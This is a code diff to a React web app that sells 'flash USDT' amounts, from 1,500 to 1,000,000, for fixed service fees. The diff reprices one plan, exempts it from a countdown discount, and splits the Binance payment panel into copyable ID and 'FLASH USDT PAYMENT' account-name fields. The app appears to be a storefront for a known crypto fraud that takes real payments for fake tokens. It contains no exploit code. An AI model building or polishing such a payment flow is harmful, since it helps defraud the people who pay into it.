@@ -30,7 +30,7 @@ import {
 const DISCOUNT_EXPIRY = new Date('2026-03-11T11:50:51Z').getTime();
 
 const PLANS = [
-  { id: 'p1', flash: 1500, fee: 30 },
+  { id: 'p1', flash: 1500, fee: 25, noDiscount: true },
   { id: 'p2', flash: 3000, fee: 50 },
   { id: 'p3', flash: 6000, fee: 85 },
   { id: 'p4', flash: 10000, fee: 140 },
@@ -42,11 +42,12 @@ const PLANS = [
   { id: 'p10', flash: 1000000, fee: 8000 },
 ];
 
-const getEffectiveFee = (fee: number, isDiscountActive: boolean) => {
-  if (isDiscountActive) {
-    return Math.round(fee * 0.6); // 40% discount
+const getEffectiveFee = (plan: typeof PLANS[0] | undefined, isDiscountActive: boolean) => {
+  if (!plan) return 0;
+  if (isDiscountActive && !plan.noDiscount) {
+    return Math.round(plan.fee * 0.6); // 40% discount
   }
-  return fee;
+  return plan.fee;
 };
 
 const PAYMENT_METHODS = [
@@ -413,7 +414,7 @@ export default function App() {
   };
 
   const handlePurchase = () => {
-    const fee = getEffectiveFee(selectedPlan?.fee || 0, isDiscountActive);
+    const fee = getEffectiveFee(selectedPlan, isDiscountActive);
     if (selectedPlan && walletBalance >= fee) {
       setWalletBalance(prev => prev - fee);
       setStep('success');
@@ -580,7 +581,7 @@ export default function App() {
                       >
                         <span className="text-xs">${plan.flash >= 1000000 ? '1M' : plan.flash >= 1000 ? `${plan.flash/1000}K` : plan.flash}</span>
                         <span className={`text-[8px] font-mono ${selectedPlan?.id === plan.id ? 'text-black/60' : 'text-[#FF3131]'}`}>
-                          Fee: ${getEffectiveFee(plan.fee, isDiscountActive)}
+                          Fee: ${getEffectiveFee(plan, isDiscountActive)}
                         </span>
                       </button>
                     ))}
@@ -734,13 +735,13 @@ export default function App() {
                   <div className="flex items-center justify-between p-4 bg-white/5 rounded-xl border border-white/10">
                     <span className="text-xs text-white/40 uppercase font-mono">Service Fee</span>
                     <div className="text-right">
-                      {isDiscountActive && (
+                      {isDiscountActive && !selectedPlan?.noDiscount && (
                         <span className="text-[10px] text-[#FF3131] font-mono line-through opacity-50 mr-2">
                           ${selectedPlan?.fee}
                         </span>
                       )}
                       <span className="text-xl font-black text-[#FF3131]">
-                        ${getEffectiveFee(selectedPlan?.fee || 0, isDiscountActive)}
+                        ${getEffectiveFee(selectedPlan, isDiscountActive)}
                       </span>
                     </div>
                   </div>
@@ -869,20 +870,53 @@ export default function App() {
                         />
                       </div>
                     )}
-                    <div className="p-3 rounded-xl bg-black/40 border border-white/5 space-y-1">
-                      <div className="text-[9px] text-white/40 uppercase font-mono">{selectedPaymentMethod.type} Details</div>
-                      <div className="flex items-center gap-2">
-                        <code className="flex-1 p-2 bg-white/5 rounded-lg text-[10px] break-all font-mono text-white/80">
-                          {selectedPaymentMethod.id === 'binance' ? `ID: ${selectedPaymentMethod.address}\nName: FLASH USDT PAYMENT` : selectedPaymentMethod.address}
-                        </code>
-                        <button 
-                          onClick={() => handleCopy(selectedPaymentMethod.address)}
-                          className="p-2 rounded-lg bg-[#FF3131] text-black hover:bg-[#FF3131]/80 transition-colors"
-                        >
-                          {isCopying ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                        </button>
+                    {selectedPaymentMethod.id === 'binance' ? (
+                      <div className="space-y-3">
+                        <div className="p-3 rounded-xl bg-black/40 border border-white/5 space-y-1">
+                          <div className="text-[9px] text-white/40 uppercase font-mono">Binance ID</div>
+                          <div className="flex items-center gap-2">
+                            <code className="flex-1 p-2 bg-white/5 rounded-lg text-[10px] break-all font-mono text-white/80">
+                              {selectedPaymentMethod.address}
+                            </code>
+                            <button 
+                              onClick={() => handleCopy(selectedPaymentMethod.address)}
+                              className="p-2 rounded-lg bg-[#FF3131] text-black hover:bg-[#FF3131]/80 transition-colors"
+                            >
+                              {isCopying ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                            </button>
+                          </div>
+                        </div>
+                        <div className="p-3 rounded-xl bg-black/40 border border-white/5 space-y-1">
+                          <div className="text-[9px] text-white/40 uppercase font-mono">Account Name</div>
+                          <div className="flex items-center gap-2">
+                            <code className="flex-1 p-2 bg-white/5 rounded-lg text-[10px] break-all font-mono text-white/80">
+                              FLASH USDT PAYMENT
+                            </code>
+                            <button 
+                              onClick={() => handleCopy('FLASH USDT PAYMENT')}
+                              className="p-2 rounded-lg bg-[#FF3131] text-black hover:bg-[#FF3131]/80 transition-colors"
+                            >
+                              {isCopying ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                            </button>
+                          </div>
+                        </div>
                       </div>
-                    </div>
+                    ) : (
+                      <div className="p-3 rounded-xl bg-black/40 border border-white/5 space-y-1">
+                        <div className="text-[9px] text-white/40 uppercase font-mono">{selectedPaymentMethod.type} Details</div>
+                        <div className="flex items-center gap-2">
+                          <code className="flex-1 p-2 bg-white/5 rounded-lg text-[10px] break-all font-mono text-white/80">
+                            {selectedPaymentMethod.address}
+                          </code>
+                          <button 
+                            onClick={() => handleCopy(selectedPaymentMethod.address)}
+                            className="p-2 rounded-lg bg-[#FF3131] text-black hover:bg-[#FF3131]/80 transition-colors"
+                          >
+                            {isCopying ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                          </button>
+                        </div>
+                      </div>
+                    )}
 
                     <div className="space-y-3">
                       <div className="text-center">
